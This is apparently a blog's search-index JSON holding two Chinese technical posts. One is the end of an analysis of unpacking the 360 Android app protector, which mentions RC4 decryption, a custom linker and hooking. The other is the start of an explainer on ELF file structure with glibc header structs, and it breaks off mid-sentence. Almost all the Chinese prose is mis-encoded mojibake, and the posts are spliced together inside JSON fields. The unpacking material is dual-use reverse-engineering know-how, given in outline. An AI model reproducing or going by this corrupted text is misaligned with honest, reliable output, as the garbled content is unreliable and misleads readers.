sub_18E8D0 è¿™äº›å‡½æ•°æ— å£³æ— èŠ±æ— æ‰“ä¹±ï¼Œä¹Ÿæ²¡æœ‰ vmp åŠ å›ºï¼Œæ˜¾å¾—ç›¸å½“çš„å¹²å‡€ï¼Œçœ‹èµ·æ¥æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰ç®—æ³• ç®—æ³•åƒå˜ä¸‡åŒ–ï¼Œä½†æ˜¯åŠ å›ºæ°¸è¿œä¸æ˜¯é‡åœ¨ç®—æ³• é€†å‘ä¸€æ¬¾ä¼˜ç§€çš„åŠ å›ºå£³ï¼Œä»ä¸­å­¦ä¹ åˆ°çš„çŸ¥è¯†å¯ä»¥å—ç›Šç»ˆç”Ÿï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å€Ÿæ­¤æ€è€ƒå¦‚ä½•é¿å…è®©åˆ«äººè½»æ˜“æ‰¾åˆ°åŠ å›ºæ–¹æ¡ˆçš„çªç ´å£ é€¢å±±å¼€è·¯ï¼Œé‡æ°´æ­æ¡¥ã€‚å…µæ¥å°†æŒ¡ï¼Œæ°´æ¥åœŸæ©ã€‚ æˆ‘ä»¬æœ€åæ¥ hook ä¸€ä¸‹ä¸‹é¢è¿™ä¸ªåœ°æ–¹æ¥ä¸ºæˆ‘ä»¬çš„åˆ†æç”»ä¸Šåœ†æ»¡çš„å¥å·å§ è‡³æ­¤ï¼Œ360 åŠ å›ºåˆ†æå®Œæ¯• # æ€»ç»“ 360 åŠ å›ºå’Œå¸¸è§„çš„åŠ å›ºæ–¹æ¡ˆç±»ä¼¼ï¼Œéƒ½æ˜¯ å£³DEX-&gt;å£³ELF-&gt;ä¸»ELF-&gt;ä¸»DEX è¿™æ ·çš„è¿‡ç¨‹ï¼Œå…¶ä¸­å£³ ELF è§£å¯†ä¸» ELF æ‰€ç”¨åˆ°çš„ç®—æ³•æ˜¯ RC4 å’Œ uncompress , å£³ ELF åŠ è½½ä¸» ELF æ‰€ç”¨åˆ°çš„æŠ€æœ¯æ˜¯è‡ªå®ç° linker åŠ å›º so å½“ç„¶ 360 åŠ å›ºè¿˜æœ‰è®¸å¤šå€¼å¾—ç»§ç»­ç ”ç©¶åˆ†æçš„åœ°æ–¹ï¼Œä¾‹å¦‚åˆ†å‘ so å‡½æ•°çš„ vmp å…¶å†…éƒ¨é€»è¾‘ç©¶ç«Ÿæ˜¯ä»€ä¹ˆæ ·å­å‘¢ï¼Ÿnative åŒ–çš„ onCreate å‡½æ•°ï¼Œdex2c çš„åŸç†ç©¶ç«Ÿæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ æœˆé‡ä»äº‘ï¼ŒèŠ±é‡å’Œé£ï¼Œä»Šæ™šä¸Šçš„å¤œç©ºå¾ˆç¾ # å‚è€ƒèµ„æ–™ 360 åŠ å›ºä¿å…³é”®æŠ€æœ¯æµ…æ Decrypting strings with a JEB script è‡ªå®ç° linker åŠ å›º so 360 åŠ å›ºä¿åˆ†æ è¯¯å…¥è™ç©´ï¼Œå–œå¾—è™å­ â€”â€” è®°ä¸€æ¬¡æ‰‹æ¸¸åŠ å›ºçš„è„±å£³ä¸ä¿®å¤","categories":[],"tags":[]},{"title":"ELFç»“æ„åˆ†æåŠElfReader","slug":"ElfReader","date":"2024-02-17T06:11:23.000Z","updated":"2024-02-18T07:37:24.851Z","comments":true,"path":"ElfReader/","link":"","permalink":"https://oacia.dev/ElfReader/","excerpt":"","text":"åœ¨ Android ä¸­ä½¿ç”¨ System.load åŠ è½½ä¸€ä¸ª so æ—¶ï¼Œæ˜¯é€šè¿‡ ElfReader å»è§£æè¿™ä¸ª so çš„é‡è¦ç»“æ„åŠå±æ€§çš„ï¼Œæœ¬æ–‡å°†å¯¹ ELF çš„ç»“æ„ï¼Œé“¾æ¥è¿‡ç¨‹ï¼Œè£…è½½è¿‡ç¨‹è¿›è¡Œåˆ†æï¼Œå¹¶ç ”ç©¶ ELF åœ¨ AOSP ä¸­çš„è§£æè¿‡ç¨‹ # ELF ç»“æ„ç®€æ ELF æ–‡ä»¶ä¸»è¦åˆ†ä¸º 3 ä¸ªéƒ¨åˆ†: ELF Header æè¿°æ•´ä¸ªæ–‡ä»¶çš„ç»„ç»‡ Program Header Table åŒ…å«äº†è¿è¡Œæ—¶åŠ è½½ç¨‹åºæ‰€éœ€è¦çš„ä¿¡æ¯ Section Header Table åŒ…å«äº†é“¾æ¥æ—¶æ‰€éœ€è¦ç”¨åˆ°çš„ä¿¡æ¯ # ELF Header //https://github.com/bminor/glibc/blob/glibc-2.27/elf/elf.h#define EI_NIDENT (16)typedef struct&#123; unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */&#125; Elf32_Ehdr;# e_ident[EI_NIDENT] è¯¥å˜é‡ç»™å‡ºäº†ç”¨äºè§£ç å’Œè§£é‡Šæ–‡ä»¶ä¸­ä¸æœºå™¨æ— å…³çš„æ•°æ®çš„æ–¹å¼ã€‚è¿™ä¸ªæ•°ç»„å¯¹äºä¸åŒçš„ä¸‹æ ‡çš„å«ä¹‰å¦‚ä¸‹ å®åç§° ä¸‹æ ‡ ç›®çš„ EI_MAG0 0 æ–‡ä»¶æ ‡è¯† EI_MAG1 1 æ–‡ä»¶æ ‡è¯† EI_MAG2 2 æ–‡ä»¶æ ‡è¯† EI_MAG3 3 æ–‡ä»¶æ ‡è¯† EI_CLASS 4 æ–‡ä»¶ç±» EI_DATA 5 æ•°æ®ç¼–ç  EI_VERSION 6 æ–‡ä»¶ç‰ˆæœ¬ EI_PAD 7 è¡¥é½å­—èŠ‚å¼€å§‹å¤„ # e_ident[EI_MAG0â€¦EI_MAG3] è¿™æ˜¯ ELF æ–‡ä»¶çš„å¤´ 4 ä¸ªå­—èŠ‚ï¼Œè¢«ç§°ä½œ â€œé­”æ•°â€ï¼Œæ ‡è¯†è¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ª ELF ç›®æ ‡æ–‡ä»¶ã€‚ åç§° å€¼ ä½ç½® ELFMAG0 0x7f e_ident[EI_MAG0] ELFMAG1 â€˜Eâ€™ e_ident[EI_MAG1] ELFMAG2 â€˜Lâ€™ e_ident[EI_MAG2] ELFMAG3 â€˜Fâ€™ e_ident[EI_MAG3] # e_ident[EI_CLASS] æ ‡è¯†æ–‡ä»¶çš„ç±»å‹æˆ–å®¹é‡ åç§° å€¼ æ„ä¹‰ ELFCLASSNONE 0 æ— æ•ˆç±»å‹ ELFCLASS32 1 32 ä½æ–‡ä»¶ ELFCLASS64 2 64 ä½æ–‡ä»¶ # e_ident[EI_DATA] ç»™å‡ºç›®æ ‡æ–‡ä»¶ä¸­çš„ç‰¹å®šå¤„ç†å™¨æ•°æ®çš„ç¼–ç æ–¹å¼ åç§° å€¼ æ„ä¹‰ ELFDATANONE 0 æ— æ•ˆæ•°æ®ç¼–ç  ELFDATA2LSB 1 å°ç«¯ ELFDATA2MSB 2 å¤§ç«¯ # e_type e_type æ ‡è¯†ç›®æ ‡æ–‡ä»¶ç±»å‹ã€‚ åç§° å€¼ æ„ä¹‰ ET_NONE 0 æ— æ–‡ä»¶ç±»å‹ ET_REL 1 å¯é‡å®šä½æ–‡ä»¶ ET_EXEC 2 å¯æ‰§è¡Œæ–‡ä»¶ ET_DYN 3 å…±äº«ç›®æ ‡æ–‡ä»¶ ET_CORE 4 æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶ ET_LOPROC 0xff00 å¤„ç†å™¨æŒ‡å®šä¸‹é™ ET_HIPROC 0xffff å¤„ç†å™¨æŒ‡å®šä¸Šé™ # e_machine è¿™ä¸€é¡¹æŒ‡å®šäº†å½“å‰æ–‡ä»¶å¯ä»¥è¿è¡Œçš„æœºå™¨æ¶æ„ï¼ŒEM æ˜¯ ELF Machine çš„ç®€å†™ åç§° å€¼ æ„ä¹‰ EM_NONE 0 æ— æœºå™¨ç±»å‹ EM_M32 1 AT&amp;T WE 32100 EM_SPARC 2 SPARC EM_386 3 Intel 80386 EM_68K 4 Motorola 68000 EM_88K 5 Motorola 88000 EM_860 7 Intel 80860 EM_MIPS 8 MIPS RS3000 # e_version æ ‡è¯†ç›®æ ‡æ–‡ä»¶çš„ç‰ˆæœ¬ã€‚ åç§° å€¼ æ„ä¹‰ EV_NONE 0 æ— æ•ˆç‰ˆæœ¬ EV_CURRENT 1 å½“å‰ç‰ˆæœ¬ # e_entry è¿™ä¸€é¡¹ä¸ºç³»ç»Ÿè½¬äº¤æ§åˆ¶æƒç»™ ELF ä¸­ç›¸åº”ä»£ç çš„è™šæ‹Ÿåœ°å€ã€‚å¦‚æœæ²¡æœ‰ç›¸å…³çš„å…¥å£é¡¹ï¼Œåˆ™è¿™ä¸€é¡¹ä¸º 0ã€‚ ä¾‹å¦‚å½“ e_entry ä¸º 00 00 80 00 æ—¶ï¼Œå¾—åˆ°å¯æ‰§è¡Œç¨‹åºçš„å…¥å£åœ°å€ä¸º 0x8000 å®ƒæ˜¯ç¨‹åºçš„å…¥å£è™šæ‹Ÿåœ°å€ï¼Œæ³¨æ„ä¸æ˜¯ main å‡½æ•°çš„åœ°å€ï¼Œè€Œæ˜¯ .text æ®µçš„é¦–åœ°å€ _start ã€‚å½“ç„¶è¿™ä¹Ÿè¦æ±‚ç¨‹åºæœ¬èº«é PIE ( -no-pie ) ç¼–è¯‘çš„ä¸” ASLR å…³é—­çš„æƒ…å†µä¸‹ï¼Œå¯¹äºé ET_EXEC ç±»å‹é€šå¸¸å¹¶ä¸æ˜¯å®é™…çš„è™šæ‹Ÿåœ°å€å€¼. # e_phoff è¿™ä¸€é¡¹ç»™å‡ºç¨‹åºå¤´éƒ¨è¡¨åœ¨æ–‡ä»¶ä¸­çš„å­—èŠ‚åç§»ï¼ˆProgram Header table OFFsetï¼‰ã€‚å¦‚æœæ–‡ä»¶ä¸­æ²¡æœ‰ç¨‹åºå¤´éƒ¨è¡¨ï¼Œåˆ™ä¸º 0ã€‚ # e_shoff è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´è¡¨åœ¨æ–‡ä»¶ä¸­çš„å­—èŠ‚åç§»ï¼ˆ Section Header table OFFset ï¼‰ã€‚å¦‚æœæ–‡ä»¶ä¸­æ²¡æœ‰èŠ‚å¤´è¡¨ï¼Œåˆ™ä¸º 0ã€‚ # e_flags è¿™ä¸€é¡¹ç»™å‡ºæ–‡ä»¶ä¸­ä¸ç‰¹å®šå¤„ç†å™¨ç›¸å…³çš„æ ‡å¿—ï¼Œè¿™äº›æ ‡å¿—å‘½åæ ¼å¼ä¸º EF_machine_flag ã€‚ # e_ehsize è¿™ä¸€é¡¹ç»™å‡º ELF æ–‡ä»¶å¤´éƒ¨çš„å­—èŠ‚é•¿åº¦ï¼ˆELF Header Sizeï¼‰ã€‚ # e_phentsize è¿™ä¸€é¡¹ç»™å‡ºç¨‹åºå¤´éƒ¨è¡¨ä¸­æ¯ä¸ªè¡¨é¡¹çš„å­—èŠ‚é•¿åº¦ï¼ˆProgram Header ENTry SIZEï¼‰ã€‚æ¯ä¸ªè¡¨é¡¹çš„å¤§å°ç›¸åŒã€‚ # e_phnum è¿™ä¸€é¡¹ç»™å‡ºç¨‹åºå¤´éƒ¨è¡¨çš„é¡¹æ•°ï¼ˆ Program Header entry NUMber ï¼‰ã€‚å› æ­¤ï¼Œ e_phnum ä¸ e_phentsize çš„ä¹˜ç§¯å³ä¸ºç¨‹åºå¤´éƒ¨è¡¨çš„å­—èŠ‚é•¿åº¦ã€‚å¦‚æœæ–‡ä»¶ä¸­æ²¡æœ‰ç¨‹åºå¤´éƒ¨è¡¨ï¼Œåˆ™è¯¥é¡¹å€¼ä¸º 0ã€‚ # e_shentsize è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´çš„å­—èŠ‚é•¿åº¦ï¼ˆSection Header ENTry SIZEï¼‰ã€‚ä¸€ä¸ªèŠ‚å¤´æ˜¯èŠ‚å¤´è¡¨ä¸­çš„ä¸€é¡¹ï¼›èŠ‚å¤´è¡¨ä¸­æ‰€æœ‰é¡¹å æ®çš„ç©ºé—´å¤§å°ç›¸åŒã€‚ # e_shnum è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´è¡¨ä¸­çš„é¡¹æ•°ï¼ˆSection Header NUMberï¼‰ã€‚å› æ­¤ï¼Œ e_shnum ä¸ e_shentsize çš„ä¹˜ç§¯å³ä¸ºèŠ‚å¤´è¡¨çš„å­—èŠ‚é•¿åº¦ã€‚å¦‚æœæ–‡ä»¶ä¸­æ²¡æœ‰èŠ‚å¤´è¡¨ï¼Œåˆ™è¯¥é¡¹å€¼ä¸º 0ã€‚ # e_shstrndx è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´è¡¨ä¸­ä¸èŠ‚åå­—ç¬¦ä¸²è¡¨ç›¸å…³çš„è¡¨é¡¹çš„ç´¢å¼•å€¼ï¼ˆSection Header table InDeX related with section name STRing tableï¼‰, å³ section table ä¸­çš„ç¬¬ e_shstrndx é¡¹å…ƒç´ ï¼Œä¿å­˜äº†æ‰€æœ‰ section table åç§°çš„å­—ç¬¦ä¸²ä¿¡æ¯ã€‚å¦‚æœæ–‡ä»¶ä¸­æ²¡æœ‰èŠ‚åå­—ç¬¦ä¸²è¡¨ï¼Œåˆ™è¯¥é¡¹å€¼ä¸º SHN_UNDEF # Program Header Program Header Table æ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæ¯ä¸€ä¸ªå…ƒç´ çš„ç±»å‹æ˜¯ Elf32_Phdr ï¼Œæè¿°äº†ä¸€ä¸ªæ®µæˆ–è€…å…¶å®ƒç³»ç»Ÿåœ¨å‡†å¤‡ç¨‹åºæ‰§è¡Œæ—¶æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚å…¶ä¸­ï¼ŒELF å¤´ä¸­çš„ e_phentsize å’Œ e_phnum æŒ‡å®šäº†è¯¥æ•°ç»„æ¯ä¸ªå…ƒç´ çš„å¤§å°ä»¥åŠå…ƒç´ ä¸ªæ•°ã€‚ä¸€ä¸ªç›®æ ‡æ–‡ä»¶çš„æ®µåŒ…å«ä¸€ä¸ªæˆ–è€…å¤šä¸ªèŠ‚ã€‚ç¨‹åºçš„å¤´éƒ¨åªæœ‰å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶æœ‰æ„ä¹‰ã€‚ å¯ä»¥è¯´ï¼ŒProgram Header Table å°±æ˜¯ä¸“é—¨ä¸º ELF æ–‡ä»¶è¿è¡Œæ—¶ä¸­çš„æ®µæ‰€å‡†å¤‡çš„ã€‚ Elf32_Phdr çš„æ•°æ®ç»“æ„å¦‚ä¸‹ typedef struct&#123; Elf32_Word p_type; /* Segment type */ Elf32_Off p_offset; /* Segment file offset */ Elf32_Addr p_vaddr; /* Segment virtual address */ Elf32_Addr p_paddr; /* Segment physical address */ Elf32_Word p_filesz; /* Segment size in file */ Elf32_Word p_memsz; /* Segment size in memory */ Elf32_Word p_flags; /* Segment flags */ Elf32_Word p_align; /* Segment alignment */&#125; Elf32_Phdr;æ¯ä¸ªå­—æ®µçš„è¯´æ˜å¦‚ä¸‹ å­—æ®µ è¯´æ˜ p_type è¯¥å­—æ®µä¸ºæ®µçš„ç±»å‹ï¼Œæˆ–è€…è¡¨æ˜äº†è¯¥ç»“æ„çš„ç›¸å…³ä¿¡æ¯ã€‚ p_offset è¯¥å­—æ®µç»™å‡ºäº†ä»æ–‡ä»¶å¼€å§‹åˆ°è¯¥æ®µå¼€å¤´çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åç§»ã€‚ p_vaddr è¯¥å­—æ®µç»™å‡ºäº†è¯¥æ®µç¬¬ä¸€ä¸ªå­—èŠ‚åœ¨å†…å­˜ä¸­çš„è™šæ‹Ÿåœ°å€ã€‚ p_paddr è¯¥å­—æ®µä»…ç”¨äºç‰©ç†åœ°å€å¯»å€ç›¸å…³çš„ç³»ç»Ÿä¸­ï¼Œ ç”±äº â€œSystem Vâ€ å¿½ç•¥äº†åº”ç”¨ç¨‹åºçš„ç‰©ç†å¯»å€ï¼Œå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶çš„è¯¥é¡¹å†…å®¹å¹¶æœªè¢«é™å®šã€‚ p_filesz è¯¥å­—æ®µç»™å‡ºäº†æ–‡ä»¶é•œåƒä¸­è¯¥æ®µçš„å¤§å°ï¼Œå¯èƒ½ä¸º 0ã€‚ p_memsz è¯¥å­—æ®µç»™å‡ºäº†å†…å­˜é•œåƒä¸­è¯¥æ®µçš„å¤§å°ï¼Œå¯èƒ½ä¸º 0ã€‚ p_flags è¯¥å­—æ®µç»™å‡ºäº†ä¸æ®µç›¸å…³çš„æ ‡è®°ã€‚ p_align å¯åŠ è½½çš„ç¨‹åºçš„æ®µçš„ p_vaddr ä»¥åŠ p_offset çš„å¤§å°å¿…é¡»æ˜¯ page çš„æ•´æ•°å€ã€‚è¯¥æˆå‘˜ç»™å‡ºäº†æ®µåœ¨æ–‡ä»¶ä»¥åŠå†…å­˜ä¸­çš„å¯¹é½æ–¹å¼ã€‚å¦‚æœè¯¥å€¼ä¸º 0 æˆ– 1 çš„è¯ï¼Œè¡¨ç¤ºä¸éœ€è¦å¯¹é½ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œp_align åº”è¯¥æ˜¯ 2 çš„æ•´æ•°æŒ‡æ•°æ¬¡æ–¹ï¼Œå¹¶ä¸” p_vaddr ä¸ p_offset åœ¨æ¨¡ p_align çš„æ„ä¹‰ä¸‹ï¼Œåº”è¯¥ç›¸ç­‰ã€‚ # p_type å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æ®µç±»å‹å¦‚ä¸‹ åå­— å–å€¼ è¯´æ˜ PT_NULL 0 è¡¨æ˜æ®µæœªä½¿ç”¨ï¼Œå…¶ç»“æ„ä¸­å…¶ä»–æˆå‘˜éƒ½æ˜¯æœªå®šä¹‰çš„ã€‚ PT_LOAD 1 æ­¤ç±»å‹æ®µä¸ºä¸€ä¸ªå¯åŠ è½½çš„æ®µï¼Œå¤§å°ç”± p_filesz å’Œ p_memsz æè¿°ã€‚æ–‡ä»¶ä¸­çš„å­—èŠ‚è¢«æ˜ å°„åˆ°ç›¸åº”å†…å­˜æ®µå¼€å§‹å¤„ã€‚å¦‚æœ p_memsz å¤§äº p_fileszï¼Œâ€œå‰©ä½™â€ çš„å­—èŠ‚éƒ½è¦è¢«ç½®ä¸º 0ã€‚p_filesz ä¸èƒ½å¤§äº p_memszã€‚å¯åŠ è½½çš„æ®µåœ¨ç¨‹åºå¤´éƒ¨ä¸­æŒ‰ç…§ p_vaddr çš„å‡åºæ’åˆ—ã€‚ PT_DYNAMIC 2 æ­¤ç±»å‹æ®µç»™å‡ºåŠ¨æ€é“¾æ¥ä¿¡æ¯ã€‚ PT_INTERP 3 æ­¤ç±»å‹æ®µç»™å‡ºäº†ä¸€ä¸ªä»¥ NULL ç»“å°¾çš„å­—ç¬¦ä¸²çš„ä½ç½®å’Œé•¿åº¦ï¼Œè¯¥å­—ç¬¦ä¸²å°†è¢«å½“ä½œè§£é‡Šå™¨è°ƒç”¨ã€‚è¿™ç§æ®µç±»å‹ä»…å¯¹å¯æ‰§è¡Œæ–‡ä»¶æœ‰æ„ä¹‰ï¼ˆä¹Ÿå¯èƒ½å‡ºç°åœ¨å…±äº«ç›®æ ‡æ–‡ä»¶ä¸­ï¼‰ã€‚æ­¤å¤–ï¼Œè¿™ç§æ®µåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­æœ€å¤šå‡ºç°ä¸€æ¬¡ã€‚è€Œä¸”è¿™ç§ç±»å‹çš„æ®µå­˜åœ¨çš„è¯ï¼Œå®ƒå¿…é¡»åœ¨æ‰€æœ‰å¯åŠ è½½æ®µé¡¹çš„å‰é¢ã€‚ PT_NOTE 4 æ­¤ç±»å‹æ®µç»™å‡ºé™„åŠ ä¿¡æ¯çš„ä½ç½®å’Œå¤§å°ã€‚ PT_SHLIB 5 è¯¥æ®µç±»å‹è¢«ä¿ç•™ï¼Œä¸è¿‡è¯­ä¹‰æœªæŒ‡å®šã€‚è€Œä¸”ï¼ŒåŒ…å«è¿™ç§ç±»å‹çš„æ®µçš„ç¨‹åºä¸ç¬¦åˆ ABI æ ‡å‡†ã€‚ PT_PHDR 6 è¯¥æ®µç±»å‹çš„æ•°ç»„å…ƒç´ å¦‚æœå­˜åœ¨çš„è¯ï¼Œåˆ™ç»™å‡ºäº†ç¨‹åºå¤´éƒ¨è¡¨è‡ªèº«çš„å¤§å°å’Œä½ç½®ï¼Œæ—¢åŒ…æ‹¬åœ¨æ–‡ä»¶ä¸­ä¹ŸåŒ…æ‹¬åœ¨å†…å­˜ä¸­çš„ä¿¡æ¯ã€‚æ­¤ç±»å‹çš„æ®µåœ¨æ–‡ä»¶ä¸­æœ€å¤šå‡ºç°ä¸€æ¬¡ã€‚æ­¤å¤–ï¼Œåªæœ‰ç¨‹åºå¤´éƒ¨è¡¨æ˜¯ç¨‹åºçš„å†…å­˜æ˜ åƒçš„ä¸€éƒ¨åˆ†æ—¶ï¼Œå®ƒæ‰ä¼šå‡ºç°ã€‚å¦‚æœæ­¤ç±»å‹æ®µå­˜åœ¨ï¼Œåˆ™å¿…é¡»åœ¨æ‰€æœ‰å¯åŠ è½½æ®µé¡¹ç›®çš„å‰é¢ã€‚ PT_LOPROC~PT_HIPROC 0x70000000 ~0x7fffffff æ­¤èŒƒå›´çš„ç±»å‹ä¿ç•™ç»™å¤„ç†å™¨ä¸“ç”¨è¯­ä¹‰ã€‚ # p_flags è¢«ç³»ç»ŸåŠ è½½åˆ°å†…å­˜ä¸­çš„ç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªå¯åŠ è½½çš„æ®µã€‚å½“ç³»ç»Ÿä¸ºå¯åŠ è½½çš„æ®µåˆ›å»ºå†…å­˜é•œåƒæ—¶ï¼Œå®ƒä¼šæŒ‰ç…§ p_flags å°†æ®µè®¾ç½®ä¸ºå¯¹åº”çš„æƒé™ã€‚å¯èƒ½çš„æ®µæƒé™ä½æœ‰ å…¶ä¸­ï¼Œæ‰€æœ‰åœ¨ PF_MASKPROC ä¸­çš„æ¯”ç‰¹ä½éƒ½æ˜¯è¢«ä¿ç•™ç”¨äºä¸å¤„ç†å™¨ç›¸å…³çš„è¯­ä¹‰ä¿¡æ¯ã€‚ å¦‚æœä¸€ä¸ªæƒé™ä½è¢«è®¾ç½®ä¸º 0ï¼Œè¿™ç§ç±»å‹çš„æ®µæ˜¯ä¸å¯è®¿é—®çš„ã€‚å®é™…çš„å†…å­˜æƒé™å–å†³äºç›¸åº”çš„å†…å­˜ç®¡ç†å•å…ƒï¼Œä¸åŒçš„ç³»ç»Ÿå¯èƒ½æ“ä½œæ–¹å¼ä¸ä¸€æ ·ã€‚å°½ç®¡æ‰€æœ‰çš„æƒé™ç»„åˆéƒ½æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ç³»ç»Ÿä¸€èˆ¬ä¼šæˆäºˆæ¯”è¯·æ±‚æ›´å¤šçš„æƒé™ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œé™¤éæ˜ç¡®è¯´æ˜ï¼Œä¸€ä¸ªæ®µä¸ä¼šæœ‰å†™æƒé™ã€‚ä¸‹é¢ç»™å‡ºäº†æ‰€æœ‰çš„å¯èƒ½ç»„åˆã€‚ ä¾‹å¦‚ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œ.text æ®µä¸€èˆ¬å…·æœ‰è¯»å’Œæ‰§è¡Œæƒé™ï¼Œä½†æ˜¯ä¸ä¼šæœ‰å†™æƒé™ã€‚æ•°æ®æ®µä¸€èˆ¬å…·æœ‰å†™ï¼Œè¯»ï¼Œä»¥åŠæ‰§è¡Œæƒé™ã€‚ # Section Header ELF å¤´ä¸­çš„ e_shoff é¡¹ç»™å‡ºäº†ä»æ–‡ä»¶å¼€å¤´åˆ°èŠ‚å¤´è¡¨ä½ç½®çš„å­—èŠ‚åç§»ã€‚ e_shnum å‘Šè¯‰äº†æˆ‘ä»¬èŠ‚å¤´è¡¨åŒ…å«çš„é¡¹æ•°ï¼› e_shentsize ç»™å‡ºäº†æ¯ä¸€é¡¹çš„å­—èŠ‚å¤§å°ã€‚ èŠ‚å¤´è¡¨æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªæ•°ç»„çš„å…ƒç´ çš„ç±»å‹æ˜¯ ELF32_Shdr ï¼Œæ¯ä¸€ä¸ªå…ƒç´ éƒ½æè¿°äº†ä¸€ä¸ªèŠ‚åŒºçš„æ¦‚è¦å†…å®¹ã€‚æ¯ä¸ªèŠ‚åŒºå¤´éƒ¨å¯ä»¥ç”¨ä¸‹é¢çš„æ•°æ®ç»“æ„è¿›è¡Œæè¿°ï¼š typedef struct&#123; Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */&#125; Elf32_Shdr;æ¯ä¸ªå­—æ®µçš„å«ä¹‰å¦‚ä¸‹ æˆå‘˜ è¯´æ˜ sh_name èŠ‚åç§°ï¼Œæ˜¯èŠ‚åŒºå¤´å­—ç¬¦ä¸²è¡¨èŠ‚åŒºä¸­ï¼ˆSection Header String Table Sectionï¼‰çš„ç´¢å¼•ï¼Œå› æ­¤è¯¥å­—æ®µå®é™…æ˜¯ä¸€ä¸ªæ•°å€¼ã€‚åœ¨å­—ç¬¦ä¸²è¡¨ä¸­çš„å…·ä½“å†…å®¹æ˜¯ä»¥ NULL ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚ sh_type æ ¹æ®èŠ‚çš„å†…å®¹å’Œè¯­ä¹‰è¿›è¡Œåˆ†ç±»ï¼Œå…·ä½“çš„ç±»å‹ä¸‹é¢ä¼šä»‹ç»ã€‚ sh_flags æ¯ä¸€æ¯”ç‰¹ä»£è¡¨ä¸åŒçš„æ ‡å¿—ï¼Œæè¿°èŠ‚æ˜¯å¦å¯å†™ï¼Œå¯æ‰§è¡Œï¼Œéœ€è¦åˆ†é…å†…å­˜ç­‰å±æ€§ã€‚ sh_addr å¦‚æœèŠ‚åŒºå°†å‡ºç°åœ¨è¿›ç¨‹çš„å†…å­˜æ˜ åƒä¸­ï¼Œæ­¤æˆå‘˜ç»™å‡ºèŠ‚åŒºçš„ç¬¬ä¸€ä¸ªå­—èŠ‚åº”è¯¥åœ¨è¿›ç¨‹é•œåƒä¸­çš„ä½ç½®ã€‚å¦åˆ™ï¼Œæ­¤å­—æ®µä¸º 0ã€‚ sh_offset ç»™å‡ºèŠ‚åŒºçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸æ–‡ä»¶å¼€å§‹å¤„ä¹‹é—´çš„åç§»ã€‚SHT_NOBITS ç±»å‹çš„èŠ‚åŒºä¸å ç”¨æ–‡ä»¶çš„ç©ºé—´ï¼Œå› æ­¤å…¶ sh_offset æˆå‘˜ç»™å‡ºçš„æ˜¯æ¦‚å¿µæ€§çš„åç§»ã€‚ sh_size æ­¤æˆå‘˜ç»™å‡ºèŠ‚åŒºçš„å­—èŠ‚å¤§å°ã€‚é™¤éèŠ‚åŒºçš„ç±»å‹æ˜¯ SHT_NOBITS ï¼Œå¦åˆ™è¯¥èŠ‚å ç”¨æ–‡ä»¶ä¸­çš„ sh_size å­—èŠ‚ã€‚ç±»å‹ä¸º SHT_NOBITS çš„èŠ‚åŒºé•¿åº¦å¯èƒ½éé›¶ï¼Œä¸è¿‡å´ä¸å ç”¨æ–‡ä»¶ä¸­çš„ç©ºé—´ã€‚ sh_link æ­¤æˆå‘˜ç»™å‡ºèŠ‚åŒºå¤´éƒ¨è¡¨ç´¢å¼•é“¾æ¥ï¼Œå…¶å…·ä½“çš„è§£é‡Šä¾èµ–äºèŠ‚åŒºç±»å‹ã€‚ sh_info æ­¤æˆå‘˜ç»™å‡ºé™„åŠ ä¿¡æ¯ï¼Œå…¶è§£é‡Šä¾èµ–äºèŠ‚åŒºç±»å‹ã€‚ sh_addralign æŸäº›èŠ‚åŒºçš„åœ°å€éœ€è¦å¯¹é½ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªèŠ‚åŒºæœ‰ä¸€ä¸ª doubleword ç±»å‹çš„å˜é‡ï¼Œé‚£ä¹ˆç³»ç»Ÿå¿…é¡»ä¿è¯æ•´ä¸ªèŠ‚åŒºæŒ‰åŒå­—å¯¹é½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ sh_addr%sh_addralign=0 ã€‚ç›®å‰å®ƒä»…å…è®¸ä¸º 0ï¼Œä»¥åŠ 2 çš„æ­£æ•´æ•°å¹‚æ•°ã€‚ 0 å’Œ 1 